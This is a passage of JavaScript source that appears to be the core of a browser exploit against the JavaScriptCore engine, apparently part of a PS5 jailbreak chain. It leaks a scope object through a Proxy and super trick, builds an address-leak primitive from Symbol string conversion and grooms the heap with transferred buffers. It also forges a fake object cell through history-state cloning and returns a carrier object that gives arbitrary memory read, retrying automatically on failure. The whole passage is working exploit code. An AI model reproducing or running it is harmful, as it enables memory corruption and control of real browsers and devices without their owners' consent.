    if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0
        || IDENT_OFFSET + 8 > RW_BUFFER_SIZE)
        return 0;
    aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
    readBytes(identityBytes, rwView, 8);
    restoreCarrier(candidate);
    return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c
        ? 1 : -1;
}

function runIdentityProof(candidate) {
    candidateMutationStarted = true;
    identityResult = checkCarrierIdentity(candidate);
    return identityResult === 1;
}

function ceilingReached() {
    return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
}

function giveUp(reason) {
    stopped = true;
    emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
    const reject = settleReject;
    settleResolve = null;
    settleReject = null;
    running = false;
    if (reject !== null)
        reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
}

function failed() {
    if (ceilingReached()) {
        giveUp("attempt-ceiling");
        return;
    }
    emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
    stopped = false;
    retryScheduled = false;
    setTimeout(() => {
        try { history.replaceState(null, ""); } catch { }
        attemptNumber++;
        startAttempt();
    }, AUTO_RETRY_DELAY_MS);
}

function releaseAttemptAllocations() {

    referenceTarget = null;
    rwBuffer = null;
    rwView = null;
    rwMirror = null;
    targetBuffer = null;
    targetView = null;
    fakeHost = null;
    lengthWord = null;
    anchorElement = null;
    markerObjectA = null;
    markerObjectB = null;
    targetHolder = null;
    holderGuardA = null;
    holderGuardB = null;
    fillerGraph = null;
    outerGraph = null;
    leakedScope = null;
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    predecessorWords = null;
    keepAlive = null;
    try { history.replaceState(null, ""); } catch { }
    if (typeof globalThis.gc === "function") {
        try { globalThis.gc(); } catch { }
    }
}

function scheduleSafeRetry(reason) {
    if (retryScheduled || stopped)
        return;
    const candidateStateSafe = !candidateEverReturned
        || (zeroHeaderMiss && !candidateMutationStarted);

    if (!retrySafe || !candidateStateSafe
        || candidateMutationStarted || !attemptPersisted) {
        emit("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}`
            + `-safe=${retrySafe}`
            + `-candidate-seen=${candidateEverReturned}`
            + `-candidate-mutated=${candidateMutationStarted}`
            + `-candidate-state-safe=${candidateStateSafe}`
            + `-attempt-persisted=${attemptPersisted}`);
        failed();
        return;
    }
    if (ceilingReached()) {
        giveUp("attempt-ceiling");
        return;
    }

    retryScheduled = true;
    const nextAttempt = attemptNumber + 1;
    emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
    releaseAttemptAllocations();
    setTimeout(() => {
        const candidateStillSafe = !candidateEverReturned
            || (zeroHeaderMiss && !candidateMutationStarted);
        if (!retrySafe || !candidateStillSafe
            || candidateMutationStarted || stopped) {
            emit("AUTO-RETRY-CANCELLED", `reason=${reason}`
                + `-retry-safe=${retrySafe}`
                + `-candidate-safe=${candidateStillSafe}`
                + `-candidate-mutated=${candidateMutationStarted}`);
            failed();
            return;
        }

        attemptNumber = nextAttempt;
        startAttempt();
    }, Math.max(AUTO_RETRY_DELAY_MS, 750));
}

function finishEarlySafeAttempt(tag, extra, reason) {
    retrySafe = true;
    emit(tag, `${extra}-retry-safe=true-candidate-seen=false`
        + "-candidate-mutated=false");
    scheduleSafeRetry(reason);
}

function resetAttemptState() {
    referenceTarget = null;
    rwBuffer = null;
    rwView = null;
    rwMirror = null;
    targetBuffer = null;
    targetView = null;
    fakeHost = null;
    lengthWord = null;
    anchorElement = null;
    markerObjectA = null;
    markerObjectB = null;
    targetHolder = null;
    holderGuardA = null;
    holderGuardB = null;
    fillerGraph = null;
    outerGraph = null;
    leakedScope = null;
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    copiedLength = 0;
    captureState = 0;
    captureError = null;
    hostAddress = NaN;
    fakeAddress = NaN;
    predecessorWords = null;
    keepAlive = new Array(DRAIN_COUNT + 3);
    keepIndex = 0;
    pointerLow = 0;
    pointerHigh = 0;
    targetAddress = NaN;
    targetAddressLow = 0;
    targetAddressHigh = 0;
    nativeTargetAddress = NaN;
    anchorElementAddress = NaN;
    markerAAddress = NaN;
    markerBAddress = NaN;
    rwOriginalVector = NaN;
    rwHeaderOK = false;
    holderHeaderOK = false;
    functionHeaderOK = false;
    nativeExecutableHeaderOK = false;
    functionStructureID = 0;
    nativeExecutableStructureID = 0;
    executableAddress = NaN;
    nativeFunctionAddress = NaN;
    nativeConstructorAddress = NaN;
    pointersRepeated = false;
    restoreObserved = false;
    retrySafe = false;
    retryScheduled = false;
    candidateEverReturned = false;
    candidateMutationStarted = false;
    zeroHeaderMiss = false;
    identityResult = 0;
    identityBytes.fill(0);
    compositionState = 0;
    compositionLength = 0;
    compositionError = null;
    liveCandidate = null;
    resetProfile();
    rwHeader.fill(0);
    targetHeader.fill(0);
    holderHeader.fill(0);
}

function startAttempt() {

    if (fakeReleased)
        return;
    if (stopped)
        return;
    resetAttemptState();
    try {
        sessionStorage.setItem(attemptKey, String(attemptNumber));
        attemptPersisted = sessionStorage.getItem(attemptKey)
            === String(attemptNumber);
    } catch { }
    emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
        + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`);
    try {
        buildAndStoreGraph();

        for (let i = 0; i < 8; ++i)
            rwView[IDENT_OFFSET + i] = identityMagic[i];
        prepareAddrof();
    } catch (error) {
        finishEarlySafeAttempt("SETUP-THREW",
            `${error?.name}:${String(error?.message).slice(0, 80)}`,
            "setup-threw");
    }
}

function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (target, property, receiver) { return receiver; }
    });
    const leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === undefined || leakedScope === null)
        throw new Error("scope-not-leaked");

    for (let i = 0; i < 512; i++)
        leakedScope[`p${i}`] = i;
    for (let j = 0; j < 8; j++)
        leakedScope[j] = 1.1 * j;

    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

function buildFakeHost() {
    rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;

    targetBuffer = new ArrayBuffer(0x20);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };

    fakeHost = {
        q0: encodedHeaderNumber(),
        q1: 1.1,
        q2: rwView,
        q3: lengthWord,
        q4: 2.2,
        q5: 3.3
    };

    delete fakeHost.q1;
    delete fakeHost.q4;
    delete fakeHost.q5;

    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
        || targetView[0] !== 0xa5 || typeof nativeTarget !== "function")
        throw new Error("fake-host-shape-failed");

    anchorElement = document.createElement("textarea");
    markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
    markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
    holderGuardA = { marker: 0x484f4c44 };
    holderGuardB = { marker: 0x47554152 };
    targetHolder = {
        q0: nativeTarget,
        q1: anchorElement,
        q2: markerObjectA,
        q3: markerObjectB,
        q4: holderGuardA,
        q5: holderGuardB
    };

    if (targetHolder.q0 !== nativeTarget || targetHolder.q1 !== anchorElement
        || targetHolder.q2 !== markerObjectA
        || targetHolder.q3 !== markerObjectB
        || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB
        || anchorElement === null || typeof anchorElement !== "object"
        || markerObjectA.marker !== 0x4d41524b
        || markerObjectB.marker !== 0x4d41524c)
        throw new Error("probe-holder-shape-failed");
}

function buildAndStoreGraph() {
    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
    buildFakeHost();

    emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
    fillerGraph = new Array(0xfffd);
    let pos = 0;
    const huge = 1n << 40n;
    for (let b = 0; b < FILLER_BIGINTS; ++b)
        fillerGraph[pos++] = huge + BigInt(b);
    for (let o = 0; o < FILLER_OBJECTS; ++o)
        fillerGraph[pos++] = {};

    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);

    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
    history.replaceState(outerGraph, "");
    emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
}

function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() { return 7; };

    emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
    getterCarrier[0] = fakeHost;
    for (let i = 1; i < CARRIER_SLOTS; i++)
        getterCarrier[i] = 0;
    getterCarrier[1] = targetHolder;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetHolder;
    emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");

    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);

    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

function runAddrofCapture() {
    try {
        capturedString = symbolToString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (let i = 0; i < 16; i++)
            capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch (error) {
        captureError = error;
        captureState = -1;
    }
}

function fillRawCellPointers(backing, pointer) {
    pointerHigh = Math.floor(pointer / 0x100000000);
    pointerLow = pointer - pointerHigh * 0x100000000;

    if (!plausibleCell(pointer)
        || pointerHigh < 0 || pointerHigh > 0xffff
        || Math.floor(pointerLow) !== pointerLow
        || pointerLow < 0 || pointerLow > 0xffffffff
        || pointerLow + pointerHigh * 0x100000000 !== pointer)
        throw new Error("invalid-low48-fake-address");

    predecessorWords = new Uint32Array(backing);
    for (let i = 0; i < predecessorWords.length; i += 2) {
        predecessorWords[i] = pointerLow;
        predecessorWords[i + 1] = pointerHigh;
    }

    const last = predecessorWords.length - 2;
    if (predecessorWords[0] !== pointerLow
        || predecessorWords[1] !== pointerHigh
        || predecessorWords[last] !== pointerLow
        || predecessorWords[last + 1] !== pointerHigh)
        throw new Error("pointer-fill-verification-failed");
}

function clearPredecessor() {
    if (predecessorWords !== null)
        predecessorWords.fill(0);
}

function loadHistoryCritical() {
    let result = null;
    let candidate = null;
    let rwHeaderCaptured = false;
    let rwVectorTouched = false;
    try {
        result = history.state;
        compositionLength = result.length;

        if (compositionLength !== EXPECTED_LENGTH) {
            result[DUPLICATE_INDEX] = undefined;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 3;
            return;
        }

        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            candidate = null;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 2;
            return;
        }

        candidate = result[DUPLICATE_INDEX];
        candidateEverReturned = true;
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        readBytes(rwHeader, candidate, CELL_BYTES);
        rwHeaderCaptured = true;

        const rwSID = uint32At(rwHeader, 0);
        const rwButterfly = low48At(rwHeader, 8);
        const rwLength = uint32At(rwHeader, 0x18);
        rwOriginalVector = low48At(rwHeader, 0x10);

        const rwTailByte = rwHeader[0x20];
        const rwOffsetZero = allZero(rwHeader, 0x21, 0x28)
            && (rwTailByte === 0 || rwTailByte === 2);

        profile.carrierSID = rwSID;
        profile.carrierType = rwHeader[5];
        profile.carrierFlags = rwHeader[6];
        profile.carrierMode = rwHeader[0x1c];
        profile.carrierByte28 = rwHeader[0x28];
        profile.carrierByte20 = rwHeader[0x20];

        rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000
            && rwHeader[4] === 0
            && (rwHeader[7] === 0 || rwHeader[7] === 1)
            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
            && rwLength === RW_BUFFER_SIZE
            && rwHeader[0x1d] === 0
            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
            && rwOffsetZero;

        if (!rwHeaderOK) {
            zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
            retrySafe = zeroHeaderMiss && !rwVectorTouched
                && !candidateMutationStarted;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        rwVectorTouched = true;
        const identityProved = runIdentityProof(candidate);
        rwVectorTouched = false;
        if (!identityProved) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        for (let i = 0; i < 8; ++i)
            scratchBytes[i] = rwHeader[i];
        if (scratchBytes[6] >= 2) {
            scratchBytes[6] -= 2;
        } else {
            scratchBytes[6] = (scratchBytes[6] + 0x100 - 2) & 0xff;
            scratchBytes[7] = (scratchBytes[7] - 1) & 0xff;
        }
        const upgradedHeader = scratchDouble[0];

        const upgradedFinite = upgradedHeader === upgradedHeader
            && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
        if (!upgradedFinite) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        candidateMutationStarted = true;
        fakeHost.q0 = upgradedHeader;
        if (fakeHost.q0 !== upgradedHeader) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        rwVectorTouched = true;
        aimCarrier(candidate, targetAddress);

        const holderRepeated = readTwiceMatches(holderHeader, rwView,
            HOLDER_BYTES);
        const holderSID = uint32At(holderHeader, 0);
        const holderButterflyZero = allZero(holderHeader, 0x08, 0x10);

        nativeTargetAddress = low48At(holderHeader, 0x10);
        anchorElementAddress = low48At(holderHeader, 0x18);
        markerAAddress = low48At(holderHeader, 0x20);
        markerBAddress = low48At(holderHeader, 0x28);
        const holderGuardAAddress = low48At(holderHeader, 0x30);
        const holderGuardBAddress = low48At(holderHeader, 0x38);
        profile.holderSID = holderSID;
        profile.holderType = holderHeader[5];
        profile.holderFlags = holderHeader[6];

        holderHeaderOK = holderRepeated
            && holderSID >= 0x100 && holderSID < 0x08000000
            && targetAddress % 0x10 === 0
            && holderHeader[4] === 0
            && (holderHeader[7] === 0 || holderHeader[7] === 1)
            && holderButterflyZero
            && plausibleCell(nativeTargetAddress)
            && plausibleCell(anchorElementAddress)
            && plausibleCell(markerAAddress)
            && plausibleCell(markerBAddress)
            && plausibleCell(holderGuardAAddress)
            && plausibleCell(holderGuardBAddress)
            && canonicalLow48(holderHeader, 0x10)
            && canonicalLow48(holderHeader, 0x18)
            && canonicalLow48(holderHeader, 0x20)
            && canonicalLow48(holderHeader, 0x28)
            && canonicalLow48(holderHeader, 0x30)
            && canonicalLow48(holderHeader, 0x38)
            && nativeTargetAddress !== anchorElementAddress
            && nativeTargetAddress !== markerAAddress
            && anchorElementAddress !== markerAAddress
            && markerAAddress !== markerBAddress
            && holderGuardAAddress !== holderGuardBAddress;

        if (!holderHeaderOK) {
            restoreCarrier(candidate);
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        aimCarrier(candidate, nativeTargetAddress);
        readBytes(targetHeader, rwView, FUNCTION_BYTES);

        functionStructureID = uint32At(targetHeader, 0);
        const functionButterfly = low48At(targetHeader, 0x08);
        const functionScope = low48At(targetHeader, 0x10);
        executableAddress = low48At(targetHeader, 0x18);
        profile.functionSID = functionStructureID;
        profile.functionType = targetHeader[5];
        profile.functionFlags = targetHeader[6];
        const functionType1 = targetHeader[5];
        functionHeaderOK = functionStructureID >= 0x100
            && functionStructureID < 0x08000000
            && nativeTargetAddress % 0x10 === 0
            && targetHeader[4] === 0
            && (targetHeader[7] === 0 || targetHeader[7] === 1)
            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
            && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
            && functionButterfly > 0x100000000
            && functionButterfly <= 0xffffffffffff
            && functionButterfly % 8 === 0
            && functionScope > 0x100000000
            && functionScope <= 0xffffffffffff
            && functionScope % 8 === 0
            && executableAddress > 0x100000000
            && executableAddress <= 0xffffffffffff
            && executableAddress % 0x10 === 0
            && (executableAddress & 1) === 0;

        if (!functionHeaderOK) {
            restoreCarrier(candidate);
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        aimCarrier(candidate, executableAddress);
        readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);

        nativeExecutableStructureID = uint32At(targetHeader, 0);
        nativeFunctionAddress = low48At(targetHeader, 0x28);
        nativeConstructorAddress = low48At(targetHeader, 0x30);
        profile.nativeExecSID = nativeExecutableStructureID;
        profile.nativeExecType = targetHeader[5];
        profile.nativeExecFlags = targetHeader[6];

        try { globalThis.__ps5NativeCtor = nativeConstructorAddress; } catch (e) { }
        const nativeExecType1 = targetHeader[5];

        nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x100
            && nativeExecutableStructureID < 0x08000000
            && targetHeader[4] === 0
            && (targetHeader[7] === 0 || targetHeader[7] === 1)
            && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0
            && targetHeader[0x36] === 0 && targetHeader[0x37] === 0
            && plausibleAddress(nativeFunctionAddress)
            && plausibleAddress(nativeConstructorAddress)
            && canonicalLow48(targetHeader, 0x28)
            && canonicalLow48(targetHeader, 0x30)
            && nativeFunctionAddress !== nativeConstructorAddress;

        if (!nativeExecutableHeaderOK) {
            restoreCarrier(candidate);
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        aimCarrier(candidate, nativeTargetAddress);
        const executableAddress2 = low48At(rwView, 0x18);
        const functionType2 = rwView[5];

        aimCarrier(candidate, executableAddress);
        const nativeFunctionAddress2 = low48At(rwView, 0x28);
        const nativeConstructorAddress2 = low48At(rwView, 0x30);
        const nativeExecutableType2 = rwView[5];

        pointersRepeated = executableAddress2 === executableAddress
            && nativeFunctionAddress2 === nativeFunctionAddress
            && nativeConstructorAddress2 === nativeConstructorAddress
            && functionType2 === functionType1
            && nativeExecutableType2 === nativeExecType1;

        restoreCarrier(candidate);
        rwVectorTouched = false;
        targetView[0] = 0xa5;
        rwMirror[0] = 0x3c;
        restoreObserved = rwView[0] === 0x3c
            && rwMirror[0] === 0x3c && targetView[0] === 0xa5;

        liveCandidate = candidate;
        candidate = null;
        clearPredecessor();
        compositionState = 1;
    } catch (error) {
        retrySafe = candidate === null && result === null
            && !rwHeaderCaptured && error?.name === "TypeError";
        if (result !== null) {
            try { result[DUPLICATE_INDEX] = undefined; } catch { }
        }
        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
            try { restoreCarrier(candidate); } catch { }
        }
        candidate = null;
        result = null;
        try { targetView[0] = 0xa5; } catch { }
        try { rwMirror[0] = 0x3c; } catch { }
        try { clearPredecessor(); } catch { }
        compositionError = error;
        compositionState = -1;
    }
}

function runGroomAndLoad() {
    try {
        emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
        const channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (let i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        let slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        const separator = buffer(SEPARATOR_SIZE);
        const earlyHole = buffer(EARLY_HOLE_SIZE);
        const guard = buffer(GUARD_SIZE);
        const predecessor = buffer(PREDECESSOR_SIZE);
        const finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
        keepAlive[keepIndex++] = predecessor;
        emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
            + `-fake=${hex(fakeAddress)}`);

        criticalBarrier(fakeAddress, targetAddress);

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
            earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch {}
        retrySafe = true;
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

let barrierNode = null;

function ensureBarrierNode() {
    if (barrierNode !== null)
        return;
    try {
        barrierNode = document.createElement("div");
        barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
        document.body.appendChild(barrierNode);
    } catch { barrierNode = null; }
}

function defaultCriticalBarrier(fake, target) {
    try {
        const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
        if (barrierNode !== null) {
            barrierNode.textContent = line;
            void barrierNode.offsetWidth;
        }
        void new Blob([line], { type: "text/plain" });

        try { sessionStorage.setItem(burstKey, line); } catch { }
    } catch { }
}

function beginComposition() {
    if (captureState === 0) {
        finishEarlySafeAttempt("ADDROF-NO-RESULT",
            "capture-task-did-not-finish", "addrof-no-result");
        return;
    }
    if (captureState < 0) {
        finishEarlySafeAttempt("ADDROF-THREW",
            `${captureError?.name}:`
            + String(captureError?.message).slice(0, 80),
            "addrof-threw");
        return;
    }

    const a0 = pointerFromWords(capturedWords, 0);
    const b0 = pointerFromWords(capturedWords, 4);
    const a1 = pointerFromWords(capturedWords, 8);
    const b1 = pointerFromWords(capturedWords, 12);
    const repeated = a0 === a1 && b0 === b1;
    const distinct = a0 !== b0;
    const plausible = plausibleCell(a0) && plausibleCell(b0)
        && plausibleCell(a1) && plausibleCell(b1);
    const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    emit("ADDROF-RETURNED", REVISION);
    emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
    emit("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}`
        + `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);

    if (!(repeated && distinct && plausible && sourceCovered)) {
        finishEarlySafeAttempt("ADDROF-FAIL",
            `repeat=${repeated}-distinct=${distinct}`
            + `-plausible=${plausible}-covered=${sourceCovered}`,
            "addrof-validation");
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow
        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",
            `target=${hex(targetAddress)}`, "target-address");
        return;
    }

    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
            `host=${hex(hostAddress)}`, "fake-address");
        return;
    }
    emit("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
        + "-delta=0x10");
    runGroomAndLoad();
}

function reportComposition() {
    if (compositionState < 0) {
        emit(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
            `${compositionError?.name}:`
            + String(compositionError?.message).slice(0, 80));
        if (!retrySafe)
            failed();
        else
            scheduleSafeRetry("placement-throw");
        return;
    }

    if (compositionState === 2) {
        emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
        scheduleSafeRetry("normal-clone-miss");
        return;
    }

    if (compositionState === 3) {
        emit(identityResult === -1 ? "CARRIER-IDENTITY-FAIL"
            : (zeroHeaderMiss ? "ZERO-HEADER-MISS"
                : (retrySafe ? "COMPOSITION-LENGTH-MISS"
                    : "VALIDATION-MISMATCH")),
            `rw=${rwHeaderOK}-holder=${holderHeaderOK}`
            + `-function=${functionHeaderOK}`
            + `-native-executable=${nativeExecutableHeaderOK}`
            + `-repeat=${pointersRepeated}-retry-safe=${retrySafe}`
            + `-identity=${identityResult}`
            + `-hex=${dumpHex(rwHeader, CELL_BYTES)}`);
        if (!retrySafe)
            failed();
        else
            scheduleSafeRetry(zeroHeaderMiss
                ? "zero-header-miss" : "composition-length-mismatch");
        return;
    }

    if (compositionState === 0) {
        emit("NO-RESULT", "critical-load-did-not-finish");
        failed();
        return;
    }

    emit("SSV-RETURNED-CLEARED", `length=${compositionLength}`
        + "-predecessor-cleared=true");
    emit("RW-CARRIER", `sid=${hex(profile.carrierSID)}`
        + `-vector=${hex(rwOriginalVector)}`
        + `-length=${hex(uint32At(rwHeader, 0x18))}`
        + `-mode=${hex(profile.carrierMode)}`);
    emit("HOLDER", `cell=${hex(targetAddress)}`
        + `-textarea=${hex(anchorElementAddress)}`
        + `-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`);
    emit("JSC-PROFILE", `u8=${hex(profile.carrierType)}`
        + `-u8flags=${hex(profile.carrierFlags)}`
        + `-mode=${hex(profile.carrierMode)}`
        + `-obj=${hex(profile.holderType)}`
        + `-objflags=${hex(profile.holderFlags)}`
        + `-fn=${hex(profile.functionType)}`
        + `-fnflags=${hex(profile.functionFlags)}`
        + `-nx=${hex(profile.nativeExecType)}`
        + `-nxflags=${hex(profile.nativeExecFlags)}`);
    emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));

    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
        && nativeExecutableHeaderOK && pointersRepeated && restoreObserved
        && compositionLength === EXPECTED_LENGTH
        && liveCandidate !== null;

    if (!leakPass) {
        emit("READ-PRIMITIVE-MISMATCH", `rw=${rwHeaderOK}`
            + `-holder=${holderHeaderOK}-function=${functionHeaderOK}`
            + `-native=${nativeExecutableHeaderOK}`
            + `-repeat=${pointersRepeated}-restore=${restoreObserved}`);

        liveCandidate = null;
        failed();
        return;
    }

    emit("READ-PRIMITIVE-PASS", "arbitrary-read-established"
        + "-firmware-offsets-asserted=none");

    try { history.replaceState(null, ""); } catch { }

    stopped = true;
    running = false;
    const resolve = settleResolve;
    settleResolve = null;
    settleReject = null;
    if (resolve !== null)
        resolve(buildCarrier());
}

function buildCarrier() {

    profile.cellSize = 0x20;

    return {

        aim(address) {

            if (liveCandidate === null)
                throw new Error("core.aim: carrier is no longer live");
            if (!plausibleAddress(address))
                throw new RangeError(`core.aim: implausible address ${address}`);
            aimCarrier(liveCandidate, address);
        },
        restore() {
            if (liveCandidate === null)
                throw new Error("core.restore: carrier is no longer live");
            restoreCarrier(liveCandidate);
        },

        get view() { return rwView; },
        windowBytes: RW_BUFFER_SIZE,

        holder: targetHolder,
        holderAddress: targetAddress,
        leakSlotOffset: LEAK_SLOT_OFFSET,
        leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
        setLeakSlot(value) { targetHolder.q2 = value; },
        clearLeakSlot() { targetHolder.q2 = markerObjectA; },

        anchorObject: markerObjectA,
        anchorObjectAddress: markerAAddress,
        textarea: anchorElement,
        textareaAddress: anchorElementAddress,

        profile,
        attempts: attemptNumber,
        validate: plausibleAddress,

        hostAddress,
        fakeAddress,

        assertHome() {
            if (liveCandidate === null || rwView === null || targetView === null
                || rwMirror === null)
                return false;
            return rwView[0] === 0x3c && rwMirror[0] === 0x3c
                && targetView[0] === 0xa5;
        }
    };
}

function establishPrimitive(options) {
    const opts = options || {};

    if (fakeReleased)
        return Promise.reject(new Error(
            "core: the fake cell has been released to the real-cell pair -- "
            + "establishPrimitive cannot run again in this page"));
    if (running)
        return Promise.reject(new Error("core: already running"));
    if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
        || typeof Symbol !== "function" || typeof history === "undefined"
        || typeof history.replaceState !== "function")
        return Promise.reject(new Error("core: unsupported browser"));

    onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
    criticalBarrier = typeof opts.beforeCriticalLoad === "function"
        ? opts.beforeCriticalLoad : defaultCriticalBarrier;

    if (criticalBarrier === defaultCriticalBarrier)
        ensureBarrierNode();
    attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0
        ? opts.maxAttempts : 0;

    running = true;
    stopped = false;
    attemptNumber = 1;
    try { sessionStorage.removeItem(attemptKey); } catch { }

    return new Promise((resolve, reject) => {
        settleResolve = resolve;
        settleReject = reject;
        startAttempt();
    });
}

function currentCarrier() {
    return liveCandidate === null ? null : buildCarrier();
}

const RELEASED_BINDINGS = [
    "liveCandidate", "fakeHost", "lengthWord",
    "getterCarrier", "leakedScope", "preparedSymbolObject",
    "capturedString", "capturedWords",
    "predecessorWords", "outerGraph", "fillerGraph", "referenceTarget",
    "keepAlive"
];

function releaseFakeCell() {
    const report = {
        released: RELEASED_BINDINGS.slice(),
        alreadyReleased: fakeReleased,
        hostAddress,
        fakeAddress,
        historyCleared: false
    };
    if (fakeReleased)
        return report;

    liveCandidate = null;
    fakeHost = null;
    lengthWord = null;

    getterCarrier = null;
    leakedScope = null;
    preparedSymbolObject = null;

    capturedString = null;
    capturedWords = null;

    predecessorWords = null;
